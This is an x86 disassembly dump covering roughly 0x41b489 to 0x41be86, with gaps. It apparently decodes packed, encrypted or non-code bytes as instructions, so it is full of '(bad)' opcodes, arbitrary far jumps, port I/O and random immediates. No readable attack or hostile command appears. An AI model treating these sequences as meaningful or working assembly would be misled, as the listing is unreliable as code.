  41b489:	pop    ss
  41b48a:	push   ebp
  41b48b:	push   edx
  41b48c:	ss (bad) 
  41b48e:	neg    BYTE PTR [edi-0x762544e4]
  41b494:	(bad)  
  41b495:	scas   al,BYTE PTR es:[edi]
  41b496:	cmp    al,0x7e
  41b498:	rcr    BYTE PTR [eax],1
  41b49a:	leave  
  41b49b:	xchg   BYTE PTR [eax],al
  41b49d:	push   esi
  41b49e:	push   ds
  41b49f:	pop    edx
  41b4a0:	sar    ebx,cl
  41b4a2:	and    dh,BYTE PTR [ecx-0x35]
  41b4a5:	push   ss
  41b4a6:	xor    BYTE PTR [edx],dl
  41b4a8:	js     0x41b4cd
  41b4aa:	and    DWORD PTR [esp+edi*2],ecx
  41b4ad:	dec    edi
  41b4ae:	push   esi
  41b4af:	jo     0x41b440
  41b4b1:	lea    esp,[edx+eiz*1]
  41b4b4:	push   ds
	...
  41b515:	add    ah,dl
  41b517:	in     al,dx
  41b518:	add    edi,edi
  41b51a:	cmp    edi,edi
  41b51c:	(bad)  
  41b51d:	out    dx,eax
  41b51e:	lock add DWORD PTR [ebp-0x3c],ebp
  41b522:	pop    edi
  41b523:	rcr    BYTE PTR [ecx+0x12016c2],cl
  41b529:	add    BYTE PTR [edi],al
  41b52b:	add    DWORD PTR [eax],eax
  41b52d:	add    BYTE PTR [ebp-0x40e3737f],bh
  41b533:	rcl    bh,cl
  41b535:	leave  
  41b536:	mov    eax,0x4c26768d
  41b53b:	sbb    BYTE PTR [eax+0x46b38e17],0x9f
  41b542:	mov    eax,0x9a10ee96
  41b547:	add    al,0xc7
  41b549:	rol    esp,cl
  41b54b:	aam    0x76
  41b54d:	fild   WORD PTR [edx]
  41b54f:	loop   0x41b52e
  41b551:	jbe    0x41b593
  41b553:	jbe    0x41b530
  41b555:	xor    al,0xe7
  41b557:	call   0x514:0xa9984525
  41b55e:	push   cs
  41b55f:	push   ecx
  41b560:	int    0x83
  41b562:	inc    esp
  41b563:	add    DWORD PTR [edx],esi
  41b565:	scas   al,BYTE PTR es:[edi]
  41b566:	dec    edi
  41b567:	cmp    al,ch
  41b569:	jnp    0x41b4fb
  41b56b:	xor    eax,DWORD PTR [ebx]
  41b56d:	mov    bh,0x9e
  41b56f:	push   ecx
  41b570:	and    al,BYTE PTR [eax]
  41b572:	dec    ebx
  41b573:	fisubr WORD PTR [edx]
  41b575:	push   ebp
  41b576:	push   edx
  41b577:	and    eax,0x7db8dbe4
  41b57c:	push   cs
  41b57d:	adc    BYTE PTR [ecx],cl
  41b57f:	sbb    ah,BYTE PTR [edx+0x24e158a5]
  41b585:	std    
  41b586:	loope  0x41b512
  41b588:	pusha  
  41b589:	dec    esp
  41b58a:	jb     0x41b51d
  41b58c:	scas   eax,DWORD PTR es:[edi]
  41b58d:	cmp    ah,ch
  41b58f:	clc    
  41b590:	mov    al,0x60
  41b592:	and    eax,0x27beb9b4
  41b597:	(bad)  
  41b598:	sub    al,0xab
  41b59a:	(bad)  
  41b59b:	idiv   ah
  41b59d:	lods   eax,DWORD PTR ds:[esi]
  41b59e:	jbe    0x41b60b
  41b5a0:	push   edi
  41b5a1:	ds jp  0x41b567
  41b5a4:	(bad)  
  41b5a5:	(bad)  
  41b5a6:	cs dec ebx
  41b5a8:	pop    ecx
  41b5a9:	addr16 ss xor eax,0x9843b61d
  41b5b0:	rcr    cl,0xc0
  41b5b3:	jecxz  0x41b5c4
  41b5b5:	fldcw  WORD PTR [edi+0x6d3ab271]
  41b5bb:	jbe    0x41b624
  41b5bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5be:	sub    bl,dl
  41b5c0:	(bad)  
  41b5c1:	idiv   ch
  41b5c3:	sahf   
  41b5c4:	adc    al,0xd2
  41b5c6:	sub    ebp,0xffffff9a
  41b5c9:	adc    bh,BYTE PTR [edx*2+0x4e0bc649]
  41b5d0:	stos   DWORD PTR es:[edi],eax
  41b5d1:	dec    ebp
  41b5d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5d3:	repnz out dx,eax
  41b5d5:	jg     0x41b57f
  41b5d7:	fild   WORD PTR [edi]
  41b5d9:	daa    
  41b5da:	and    BYTE PTR [ecx-0xe729bf3],bl
  41b5e0:	or     al,0x2c
  41b5e2:	dec    esi
  41b5e3:	fdivr  QWORD PTR [edi+esi*8+0x3c7f6f78]
  41b5ea:	push   esi
  41b5eb:	jmp    0x6572:0xe0ee6c45
  41b5f2:	push   ebx
  41b5f3:	(bad)  
  41b5f4:	push   ebx
  41b5f5:	xlat   BYTE PTR ds:[ebx]
  41b5f6:	and    eax,0xb90748db
  41b5fb:	mov    edi,0xb9d109fe
  41b600:	nop
  41b601:	inc    edi
  41b602:	cmp    ecx,esi
  41b604:	pop    ss
  41b605:	into   
  41b606:	les    ecx,FWORD PTR [ebx]
  41b608:	int    0xec
  41b60a:	into   
  41b60b:	jle    0x41b661
  41b60d:	jb     0x41b5a8
  41b60f:	call   0x6a31e6d7
  41b614:	ins    DWORD PTR es:[edi],dx
  41b615:	mov    edi,0x603c08b2
  41b61a:	dec    esi
  41b61b:	add    bl,BYTE PTR [ebp+0x1c]
  41b61e:	nop
  41b61f:	fnstcw WORD PTR [ecx+0x5c928cbc]
  41b625:	adc    DWORD PTR [ebp+ebx*2-0x36],edx
  41b629:	icebp  
  41b62a:	jae    0x41b6ab
  41b62c:	or     edx,DWORD PTR [edi+0x57]
  41b62f:	dec    ecx
  41b630:	or     BYTE PTR [esi+0xf9235b],bl
	...
  41b696:	test   al,0x63
  41b698:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b69e:	cmp    al,0x28
  41b6a0:	rol    BYTE PTR [eax],1
  41b6a2:	(bad)  
  41b6a3:	cmp    eax,0x211d98f8
  41b6a8:	add    DWORD PTR [eax],eax
  41b6aa:	pop    es
  41b6ab:	add    DWORD PTR [eax],eax
  41b6ad:	add    dl,al
  41b6af:	sbb    esi,ebp
  41b6b1:	sbb    eax,edx
  41b6b3:	(bad)  
  41b6b5:	rcr    al,0x4c
  41b6b8:	in     eax,0xb9
  41b6ba:	les    ecx,FWORD PTR [esi]
  41b6bc:	data16 sub ah,BYTE PTR es:[edx]
  41b6c0:	mov    al,0x44
  41b6c2:	fmul   DWORD PTR [edx+edx*8]
  41b6c5:	in     eax,dx
  41b6c6:	ja     0x41b71f
  41b6c8:	loopne 0x41b6ee
  41b6ca:	int3   
  41b6cb:	fld    DWORD PTR [edi+0x11]
  41b6ce:	cwde   
  41b6cf:	cli    
  41b6d0:	pop    eax
  41b6d1:	xchg   esp,ebp
  41b6d3:	icebp  
  41b6d4:	adc    ebp,DWORD PTR [edi+0x6c2139b4]
  41b6da:	xlat   BYTE PTR ds:[ebx]
  41b6db:	mov    ebx,0xb32c9980
  41b6e0:	jmp    0x7e11:0x3471be53
  41b6e7:	or     edi,edx
  41b6e9:	repnz cli 
  41b6eb:	mov    ch,0xf8
  41b6ed:	(bad)  
  41b6ee:	ror    BYTE PTR [ecx+edx*2+0x72],cl
  41b6f2:	and    ah,0xcb
  41b6f5:	iret   
  41b6f6:	inc    ebp
  41b6f7:	dec    edx
  41b6f8:	push   ds
  41b6f9:	add    eax,0x93bcc95f
  41b6fe:	es xchg ebp,eax
  41b700:	or     al,0xfb
  41b702:	fistp  QWORD PTR [edi-0x10]
  41b705:	jecxz  0x41b6dd
  41b707:	mov    BYTE PTR [edx],ah
  41b709:	mov    al,0x85
  41b70b:	pop    ebp
  41b70c:	or     BYTE PTR [ecx],bh
  41b70e:	jg     0x41b775
  41b710:	out    dx,eax
  41b711:	repz jle 0x41b6cd
  41b714:	fldcw  WORD PTR [edi+esi*2-0x3f]
  41b718:	pop    edx
  41b719:	popf   
  41b71a:	and    ebx,ebx
  41b71c:	inc    DWORD PTR [edi]
  41b71e:	jmp    0xb246:0x938151ae
  41b725:	inc    ecx
  41b726:	jmp    0x24d8:0xc9194bdf
  41b72d:	gs into 
  41b72f:	and    esi,eax
  41b731:	and    ebx,eax
  41b733:	retf   
  41b734:	fsubr  DWORD PTR [edi-0x23]
  41b737:	mov    edi,0xc645fdf8
  41b73c:	cld    
  41b73d:	sar    bl,cl
  41b73f:	adc    al,0xdc
  41b741:	mov    cl,0x21
  41b743:	mov    dl,0x37
  41b745:	iret   
  41b746:	into   
  41b747:	or     ebx,DWORD PTR [edi]
  41b749:	xlat   BYTE PTR ds:[ebx]
  41b74a:	xchg   dl,ah
  41b74c:	in     eax,dx
  41b74d:	bound  ecx,QWORD PTR [edx+ecx*1-0x1]
  41b751:	xor    BYTE PTR [esi],0x8e
  41b754:	sub    DWORD PTR [esi],0x1cbdc0df
  41b75a:	push   eax
  41b75b:	sbb    ebp,0xd8b7b30a
  41b761:	pop    eax
  41b762:	push   ss
  41b763:	jb     0x41b754
  41b765:	inc    eax
  41b766:	ja     0x41b746
  41b768:	mov    fs,WORD PTR [ecx+ebx*1]
  41b76b:	mov    al,dh
  41b76d:	pop    ecx
  41b76e:	popa   
  41b76f:	mov    eax,ds:0x6010e3d5
  41b774:	xor    eax,0x57882914
  41b779:	lock dec eax
  41b77b:	add    ebp,DWORD PTR [ecx]
  41b77d:	outs   dx,DWORD PTR ds:[esi]
  41b77e:	dec    esp
  41b77f:	imul   esi,DWORD PTR [eax-0x4],0x64
  41b783:	pop    edi
  41b784:	add    BYTE PTR [ecx-0x1bfaddd4],dh
  41b78a:	stos   BYTE PTR es:[edi],al
  41b78b:	inc    esp
  41b78c:	and    ebx,DWORD PTR [edi+esi*2]
  41b78f:	inc    DWORD PTR [edi+edi*4-0x1393dfcc]
  41b796:	push   ecx
  41b797:	retf   
  41b798:	dec    esi
  41b799:	jg     0x41b7c9
  41b79b:	lahf   
  41b79c:	cmp    BYTE PTR [ebp+ecx*8-0x1f],cl
  41b7a0:	(bad)
  41b7a3:	inc    ebp
  41b7a4:	fwait
  41b7a5:	mov    ebx,0x22e776dc
  41b7aa:	xchg   DWORD PTR [edi-0x23d41133],ebp
  41b7b0:	sub    ebx,ebp
  41b7b2:	push   es
  41b7b3:	xor    esp,esp
	...
  41b815:	add    BYTE PTR [edx-0x8b13804],cl
  41b81b:	jg     0x41b7a8
  41b81d:	cld    
  41b81e:	fcmovbe st,st(0)
  41b820:	(bad)  
  41b821:	out    0x1b,al
  41b823:	pop    ds
  41b824:	(bad)  
  41b825:	jmp    0x42da4e
  41b82a:	pop    es
  41b82b:	add    DWORD PTR [eax],eax
  41b82d:	add    BYTE PTR [eax-0x10ad61e9],bl
  41b833:	not    eax
  41b835:	mov    WORD PTR [edi+0x36e7b677],ss
  41b83b:	jle    0x41b7fc
  41b83d:	je     0x41b7d0
  41b83f:	xor    bl,BYTE PTR [esp+edx*8]
  41b842:	jbe    0x41b7e9
  41b844:	les    ebp,FWORD PTR [eax+0x268c514d]
  41b84a:	xor    eax,0x77173a52
  41b84f:	fcom   DWORD PTR [eax+0x1]
  41b852:	sbb    al,0x3a
  41b854:	ret    0xf7a7
  41b857:	nop
  41b858:	sbb    ebx,DWORD PTR [bx+si+0x67]
  41b85c:	inc    eax
  41b85d:	fidiv  DWORD PTR [ebx+0x624a9903]
  41b863:	in     eax,0xc1
  41b865:	rcr    DWORD PTR [esi+ebx*4],0x60
  41b869:	push   esi
  41b86a:	shl    DWORD PTR [edi+0x31],0x99
  41b86e:	xor    ecx,DWORD PTR [edi]
  41b870:	cld    
  41b871:	pop    esi
  41b872:	fdivrp st(0),st
  41b874:	addr16 dec edi
  41b876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b877:	dec    ebx
  41b878:	sar    DWORD PTR [ebp+esi*4+0x1f],1
  41b87c:	sbb    BYTE PTR [ecx+0x421ed8a],0xe0
  41b883:	jl     0x41b80e
  41b885:	fisub  WORD PTR [ebp-0x611a20d7]
  41b88b:	push   edx
  41b88c:	lods   al,BYTE PTR ds:[esi]
  41b88d:	int    0x68
  41b88f:	jl     0x41b82b
  41b891:	mov    al,ds:0x6bd9def6
  41b896:	fmul   QWORD PTR [eax+0x19e3be91]
  41b89c:	retf   0x8cd5
  41b89f:	clc    
  41b8a0:	repz mov eax,ecx
  41b8a3:	retf   0xaac4
  41b8a6:	mov    edi,0xfa99f560
  41b8ab:	sti    
  41b8ac:	mov    DWORD PTR [edx+0x30b6fa93],esi
  41b8b2:	add    DWORD PTR [edx-0x17],0xffffffc0
  41b8b6:	fs jne 0x41b932
  41b8b9:	repnz mov edx,DWORD PTR [ecx+0x60]
  41b8bd:	pop    ss
  41b8be:	scas   al,BYTE PTR es:[edi]
  41b8bf:	cmp    al,0x71
  41b8c1:	scas   eax,DWORD PTR es:[edi]
  41b8c2:	xchg   BYTE PTR [esi],dh
  41b8c4:	aas    
  41b8c5:	add    cl,BYTE PTR [ebp+0x2e050910]
  41b8cb:	adc    DWORD PTR [eax+0x6f000ee3],0x64a6da6a
  41b8d5:	jp     0x41b891
  41b8d7:	cmp    ch,BYTE PTR [esi+0x4a4cf41e]
  41b8dd:	nop
  41b8de:	mov    ebp,0x14dbdb24
  41b8e3:	add    BYTE PTR [eax-0x1c985a1f],dl
  41b8e9:	cmp    DWORD PTR [ebp+0x44350023],0xffffff85
  41b8f0:	xor    ch,BYTE PTR [ecx+0x25]
  41b8f3:	lea    ecx,[edx+ebx*4]
  41b8f6:	shr    DWORD PTR [edx-0x7f],1
  41b8f9:	ins    DWORD PTR es:[edi],dx
  41b8fa:	(bad)  
  41b8fb:	pop    ebp
  41b8fc:	jg     0x41b93a
  41b8fe:	test   eax,0x4a74e4a
  41b903:	and    eax,0xe9e579d8
  41b908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b909:	pop    edi
  41b90a:	call   0x4e47ac94
  41b90f:	add    eax,DWORD PTR [edi-0x74]
  41b912:	xor    al,0xc9
  41b914:	into   
  41b915:	je     0x41b949
  41b917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b918:	outs   dx,DWORD PTR ds:[esi]
  41b919:	mov    DWORD PTR [edi-0x4137ce6a],esi
  41b91f:	loop   0x41b97f
  41b921:	and    ah,dh
  41b923:	arpl   di,cx
  41b925:	sbb    BYTE PTR [ebx+0x2ecefb1e],bl
  41b92b:	out    dx,al
  41b92c:	daa    
  41b92d:	imul   esi,DWORD PTR [eax-0x44e41034],0x943d
	...
  41b993:	add    BYTE PTR [eax],al
  41b995:	add    bl,al
  41b997:	mov    esp,0xf87f4844
  41b99c:	iret   
  41b99d:	mov    edi,0x51d578ae
  41b9a2:	xor    BYTE PTR [eax+0x232b30cf],bl
  41b9a8:	add    DWORD PTR [eax],eax
  41b9aa:	pop    es
  41b9ab:	add    DWORD PTR [eax],eax
  41b9ad:	add    BYTE PTR [edx+0xff1429f],ah
  41b9b3:	bound  esi,QWORD PTR [edx+eax*4+0x4]
  41b9b7:	lods   eax,DWORD PTR ds:[esi]
  41b9b8:	pop    ds
  41b9b9:	outs   dx,BYTE PTR ds:[esi]
  41b9ba:	(bad)  
  41b9bb:	inc    eax
  41b9bc:	mov    eax,ds:0xb50a15c8
  41b9c1:	loop   0x41ba05
  41b9c3:	iret   
  41b9c4:	out    dx,eax
  41b9c5:	sahf   
  41b9c6:	in     al,0x7c
  41b9c8:	jmp    0xcf94:0x1a6a8b46
  41b9cf:	jp     0x41b951
  41b9d1:	aas    
  41b9d2:	ret    
  41b9d3:	(bad)  
  41b9d4:	rcl    BYTE PTR [ebx],cl
  41b9d6:	jbe    0x41b96c
  41b9d8:	out    0x54,al
  41b9da:	retf   
  41b9db:	xchg   esi,eax
  41b9dc:	xor    esi,DWORD PTR [edx-0x518ae30d]
  41b9e2:	push   ebp
  41b9e3:	popf   
  41b9e4:	cmp    eax,DWORD PTR gs:0xf6edb9ab
  41b9eb:	js     0x41b98e
  41b9ed:	sahf   
  41b9ee:	das    
  41b9ef:	rol    DWORD PTR [ebp+0x0],1
  41b9f2:	cdq    
  41b9f3:	xchg   edx,eax
  41b9f4:	fld    DWORD PTR [edx]
  41b9f6:	es cld 
  41b9f8:	mov    ch,0xb6
  41b9fa:	xor    ebp,DWORD PTR [ebp*8+0x2c24b2e8]
  41ba01:	sub    dl,BYTE PTR [edx-0x63]
  41ba04:	mov    esp,0x913d8fb2
  41ba09:	jp     0x41b9a2
  41ba0b:	xor    eax,0xe5e9ebdf
  41ba10:	outs   dx,BYTE PTR ds:[esi]
  41ba11:	(bad)  
  41ba12:	mov    eax,0xf41754f6
  41ba17:	inc    eax
  41ba18:	cmp    BYTE PTR [ecx],0x8f
  41ba1b:	push   es
  41ba1c:	jae    0x41b9d2
  41ba1e:	repz xor bh,BYTE PTR [eax+0x2]
  41ba22:	aaa    
  41ba23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba24:	adc    BYTE PTR [ecx-0x4d],cl
  41ba27:	mov    ecx,ebp
  41ba29:	xlat   BYTE PTR ds:[ebx]
  41ba2a:	test   BYTE PTR [ebx+eiz*4],dh
  41ba2d:	push   ds
  41ba2e:	aaa    
  41ba2f:	mov    cl,0xa0
  41ba31:	faddp  st(2),st
  41ba33:	loop   0x41ba30
  41ba35:	jecxz  0x41b9bd
  41ba37:	sub    al,0x21
  41ba39:	(bad)  
  41ba3a:	call   0xde6d896e
  41ba3f:	push   edi
  41ba40:	test   al,0x91
  41ba42:	js     0x41ba54
  41ba44:	stos   DWORD PTR es:[edi],eax
  41ba45:	sbb    al,ch
  41ba47:	sbb    esi,DWORD PTR ds:0x5728f393
  41ba4d:	xor    eax,0xe352b03d
  41ba52:	rcl    DWORD PTR [esi+0xf16c318],1
  41ba58:	add    DWORD PTR ds:0x2907c868,ecx
  41ba5e:	test   eax,0xf3f19e56
  41ba63:	mov    cx,0x758
  41ba67:	arpl   WORD PTR [esi-0x35],ax
  41ba6a:	sti    
  41ba6b:	sahf   
  41ba6c:	xchg   BYTE PTR [edx+0x28],cl
  41ba6f:	xor    bh,al
  41ba71:	adc    cl,BYTE PTR [edi]
  41ba73:	inc    edx
  41ba74:	xor    DWORD PTR [ebp-0x39],ebp
  41ba77:	jbe    0x41bae6
  41ba79:	dec    ebp
  41ba7a:	call   0x3509d0fe
  41ba7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba80:	add    al,0x9e
  41ba82:	adc    BYTE PTR [edi-0x58],0x71
  41ba86:	push   es
  41ba87:	test   BYTE PTR [edi-0x8],bh
  41ba8a:	mov    eax,0xf4abaa6
  41ba8f:	fild   WORD PTR [ecx+0x264346ff]
  41ba95:	add    eax,DWORD PTR [ecx+0x12]
  41ba98:	xor    eax,0xe5c490bb
  41ba9d:	sbb    esp,DWORD PTR [esi-0x30d2b46e]
  41baa3:	ror    ecx,1
  41baa5:	rcr    DWORD PTR [ecx+ecx*2],1
  41baa8:	pop    ebx
  41baa9:	rcr    BYTE PTR [edx],1
  41baab:	mov    ebx,0x1eb6198b
  41bab0:	mov    WORD PTR [edi+0x42],?
  41bab3:	sub    BYTE PTR [eax+0x0],dl
	...
  41bb16:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb1c:	(bad)  
  41bb1e:	lahf   
  41bb1f:	and    esp,DWORD PTR [ebx-0x56]
  41bb22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb23:	das    
  41bb24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb25:	shl    DWORD PTR [edx],0x24
  41bb28:	add    DWORD PTR [eax],eax
  41bb2a:	pop    es
  41bb2b:	add    DWORD PTR [eax],eax
  41bb2d:	add    BYTE PTR [ecx-0x6f],al
  41bb30:	push   ecx
  41bb31:	daa    
  41bb32:	jb     0x41baee
  41bb34:	add    ch,BYTE PTR es:[edi]
  41bb37:	jae    0x41bad2
  41bb39:	mov    edx,0x11b92c42
  41bb3e:	jg     0x41bb35
  41bb40:	ret    
  41bb41:	sbb    ecx,DWORD PTR [ebx-0x16991c93]
  41bb47:	mov    ds:0x2f3f91ed,eax
  41bb4c:	jno    0x41bba5
  41bb4e:	push   edx
  41bb4f:	pop    edi
  41bb50:	mov    ds:0x29b2482c,al
  41bb55:	popa   
  41bb56:	mov    ah,0xbf
  41bb58:	cmp    cl,BYTE PTR [ebx+0x3ad22f43]
  41bb5e:	lahf   
  41bb5f:	test   BYTE PTR [eax-0x33c1a7d9],0xce
  41bb66:	call   0x4f1d:0x15174515
  41bb6d:	das    
  41bb6e:	enter  0xeaff,0xf0
  41bb72:	mov    al,ds:0xc0aa9692
  41bb77:	inc    esi
  41bb78:	scas   eax,DWORD PTR es:[edi]
  41bb79:	int    0x53
  41bb7b:	mov    ch,0x80
  41bb7d:	mov    BYTE PTR [ebp-0x1b],ah
  41bb80:	inc    esp
  41bb81:	into   
  41bb82:	(bad)  
  41bb83:	mov    ebp,0x4ea566b7
  41bb88:	fwait
  41bb89:	arpl   bx,ax
  41bb8b:	dec    eax
  41bb8c:	add    esi,DWORD PTR [ebp-0x6265174f]
  41bb92:	jne    0x41bbba
  41bb94:	pop    esp
  41bb95:	ins    BYTE PTR es:[edi],dx
  41bb96:	sbb    cl,BYTE PTR [ebx-0x3bd7f480]
  41bb9c:	outs   dx,BYTE PTR ds:[esi]
  41bb9d:	scas   al,BYTE PTR es:[edi]
  41bb9e:	xor    ebp,ebx
  41bba0:	dec    edi
  41bba1:	xor    ecx,DWORD PTR [esp+edi*8-0x46]
  41bba5:	add    al,dl
  41bba7:	jae    0x41bb59
  41bba9:	inc    ebx
  41bbaa:	dec    esp
  41bbab:	jl     0x41bbe8
  41bbad:	mov    ebx,0xbd536b93
  41bbb2:	adc    bh,BYTE PTR [edi-0x53c9c485]
  41bbb8:	in     eax,dx
  41bbb9:	pop    edx
  41bbba:	(bad)  [eax]
  41bbbc:	data16 jl 0x41bbec
  41bbbf:	or     ebx,DWORD PTR [ebp-0x9f0aac6]
  41bbc5:	mov    dh,0x6d
  41bbc7:	lods   eax,DWORD PTR ds:[esi]
  41bbc8:	or     DWORD PTR [edi-0xfa33d94],0x8db0317
  41bbd2:	and    DWORD PTR [ebp+0x43],0xffffff9a
  41bbd6:	sbb    bh,BYTE PTR [ebp+eax*1+0x1d]
  41bbda:	pop    edx
  41bbdb:	ins    DWORD PTR es:[edi],dx
  41bbdc:	test   edi,edi
  41bbde:	test   BYTE PTR [eax-0x877c0c],ch
  41bbe4:	xchg   ebx,eax
  41bbe5:	stc    
  41bbe6:	clc    
  41bbe7:	dec    eax
  41bbe8:	add    bl,cl
  41bbea:	pop    ss
  41bbeb:	and    dl,0x88
  41bbee:	loope  0x41bc0e
  41bbf0:	and    dh,al
  41bbf2:	imul   esi,ebp,0x8f4fbbe2
  41bbf8:	fs xchg esp,eax
  41bbfa:	fisttp DWORD PTR [esi-0x73]
  41bbfd:	mov    edi,0x9d4e56ea
  41bc02:	ds inc eax
  41bc04:	lahf   
  41bc05:	cmp    edi,DWORD PTR [esi+eax*4]
  41bc08:	or     BYTE PTR [ebx-0x6f],al
  41bc0b:	out    dx,eax
  41bc0c:	sbb    eax,0x41923e77
  41bc11:	cmc    
  41bc12:	sar    DWORD PTR [ebp+0x7dcc5e43],0x67
  41bc19:	scas   al,BYTE PTR es:[edi]
  41bc1a:	fadd   DWORD PTR [edx-0x4a70b3a6]
  41bc20:	sbb    DWORD PTR [eax-0x3e],esi
  41bc23:	pop    ss
  41bc24:	mov    dl,BYTE PTR [ecx-0x7b27a80e]
  41bc2a:	leave  
  41bc2b:	push   ebx
  41bc2c:	push   0x71329f00
  41bc31:	pop    ss
  41bc32:	iret   
  41bc33:	and    DWORD PTR [eax+0x0],edx
	...
  41bc96:	shl    BYTE PTR [edx],cl
  41bc98:	cli    
  41bc99:	clc    
  41bc9a:	cli    
  41bc9b:	clc    
  41bc9c:	sar    BYTE PTR [edx],cl
  41bc9e:	js     0x2abf248d
  41bca4:	fsub   DWORD PTR [ecx+edi*1+0x7000125]
  41bcab:	add    DWORD PTR [eax],eax
  41bcad:	add    dh,dl
  41bcaf:	cmc    
  41bcb0:	xchg   esp,eax
  41bcb1:	and    ah,BYTE PTR [edi+0x54]
  41bcb4:	sub    al,bh
  41bcb6:	mov    ecx,0x59828bf8
  41bcbb:	sbb    eax,0x64e1359a
  41bcc0:	xor    al,0xf1
  41bcc2:	mov    esp,0xad2359f6
  41bcc7:	xlat   BYTE PTR ds:[ebx]
  41bcc8:	aam    0xa6
  41bcca:	or     al,0x1a
  41bccc:	fild   QWORD PTR [ebx-0x2a]
  41bccf:	aas    
  41bcd0:	sti    
  41bcd1:	out    0x17,al
  41bcd3:	int    0x55
  41bcd5:	into   
  41bcd6:	inc    edx
  41bcd7:	(bad)  
  41bcd8:	mov    ebx,0xd0f5d9a4
  41bcdd:	dec    eax
  41bcde:	popf   
  41bcdf:	jmp    0x41bd40
  41bce1:	pusha  
  41bce2:	ins    DWORD PTR es:[edi],dx
  41bce3:	push   0xffffffe9
  41bce5:	(bad)  
  41bce6:	xchg   esi,eax
  41bce7:	push   ecx
  41bce8:	pop    edi
  41bce9:	dec    ebp
  41bcea:	jnp    0x41bcd0
  41bcec:	sbb    edi,DWORD PTR [edx+0x476706be]
  41bcf2:	outs   dx,BYTE PTR ds:[esi]
  41bcf3:	fcmove st,st(6)
  41bcf5:	jecxz  0x41bc79
  41bcf7:	imul   esp,DWORD PTR [ebx-0x61],0xfffffff5
  41bcfb:	fadd   DWORD PTR [edx+0x6]
  41bcfe:	call   0xebc4d54b
  41bd03:	inc    esi
  41bd04:	push   esi
  41bd05:	fist   WORD PTR [eax]
  41bd07:	dec    ebx
  41bd08:	daa    
  41bd09:	mov    al,0x10
  41bd0b:	jmp    0x97f758da
  41bd10:	mov    edx,0x1944f81
  41bd15:	aaa    
  41bd16:	imul   esi,DWORD PTR [ecx+eiz*4-0x5],0x2b
  41bd1b:	adc    BYTE PTR ds:0x89413401,cl
  41bd21:	scas   al,BYTE PTR es:[edi]
  41bd22:	fcomp  DWORD PTR [ebp-0x5cf370b2]
  41bd28:	test   BYTE PTR [edx+esi*2-0x4a],ch
  41bd2c:	outs   dx,BYTE PTR ds:[esi]
  41bd2d:	xchg   edx,eax
  41bd2e:	mov    bl,0x23
  41bd30:	ja     0x41bd9b
  41bd32:	pop    esi
  41bd33:	imul   ebx,DWORD PTR [ebp+0x7b],0x6a
  41bd37:	retf   0x9f40
  41bd3a:	jno    0x41bd24
  41bd3c:	jbe    0x41bd7c
  41bd3e:	inc    esp
  41bd3f:	repnz sub al,0x96
  41bd42:	or     DWORD PTR [eax-0xcb5183c],ecx
  41bd48:	nop
  41bd49:	(bad)  
  41bd4a:	push   cs
  41bd4b:	inc    edi
  41bd4c:	sub    ebx,DWORD PTR [ecx+0x3a62d9dc]
  41bd52:	or     DWORD PTR [edi],0xd
  41bd55:	fsubp  st(1),st
  41bd57:	retf   
  41bd58:	push   ss
  41bd59:	dec    ebx
  41bd5a:	aaa    
  41bd5b:	adc    al,0x4
  41bd5d:	push   0xffffffb7
  41bd5f:	sti    
  41bd60:	and    DWORD PTR [ebp+0x2897aff],0xac84a57c
  41bd6a:	enter  0xd4e9,0xe7
  41bd6e:	sbb    BYTE PTR [ecx],dl
  41bd70:	aam    0xa9
  41bd72:	inc    edx
  41bd73:	call   0xba56:0x220c8241
  41bd7a:	or     esi,DWORD PTR ds:0xe685b95f
  41bd80:	(bad)  
  41bd81:	pop    edx
  41bd82:	mov    ebp,0x97a3375f
  41bd87:	inc    eax
  41bd88:	arpl   WORD PTR [esi-0x26005949],dx
  41bd8e:	dec    ecx
  41bd8f:	xchg   dl,cl
  41bd91:	cdq    
  41bd92:	mov    dl,BYTE PTR [ecx]
  41bd94:	int3   
  41bd95:	mov    ds:0x9976c115,al
  41bd9a:	ret    0x6570
  41bd9d:	lods   eax,DWORD PTR ds:[esi]
  41bd9e:	jno    0x41bdf0
  41bda0:	fnstsw ax
  41bda2:	ins    BYTE PTR es:[edi],dx
  41bda3:	div    BYTE PTR [eax+0x615fc985]
  41bda9:	mov    eax,0x77a94059
  41bdae:	dec    eax
  41bdaf:	int    0xb1
  41bdb1:	fsubr  DWORD PTR [esi]
  41bdb3:	mov    dl,bh
	...
  41be15:	add    BYTE PTR [ebp-0x63956373],al
  41be1b:	jnp    0x41be14
  41be1d:	out    dx,eax
  41be1e:	add    BYTE PTR [ebp-0x32],dh
  41be21:	push   edx
  41be22:	push   ebp
  41be23:	mov    esi,0x264064e4
  41be28:	add    DWORD PTR [eax],eax
  41be2a:	pop    es
  41be2b:	add    DWORD PTR [eax],eax
  41be2d:	add    bh,bh
  41be2f:	sub    DWORD PTR [ecx-0x6a04f91b],edi
  41be35:	jnp    0x41bdea
  41be37:	mov    esi,?
  41be39:	adc    eax,0xff858efc
  41be3e:	mov    esp,0xfca110da
  41be43:	pushf  
  41be44:	stos   DWORD PTR es:[edi],eax
  41be45:	xor    esp,0xa40ea968
  41be4b:	mov    eax,0x5f7071f0
  41be50:	jmp    0x5b7b30d4
  41be55:	dec    ebx
  41be56:	pop    ebp
  41be57:	cmp    bh,BYTE PTR [ebp-0x3d]
  41be5a:	push   0xfd5df66c
  41be5f:	ret    0xe886
  41be62:	ja     0x41bde5
  41be64:	adc    dl,BYTE PTR [ecx-0x49b721a6]
  41be6a:	imul   edi,ecx,0x256995c5
  41be70:	ss leave 
  41be72:	dec    edi
  41be73:	dec    ecx
  41be74:	fiadd  DWORD PTR [eax]
  41be76:	mov    ecx,0xddfdd586
  41be7b:	push   ebx
  41be7c:	out    dx,al
  41be7d:	inc    edx
  41be7e:	push   eax
  41be7f:	scas   eax,DWORD PTR es:[edi]
  41be80:	es aas 
  41be82:	sub    DWORD PTR [ebp+0x56],eax
  41be85:	out    dx,al
  41be86:	mov    ds:0x36845d31,eax
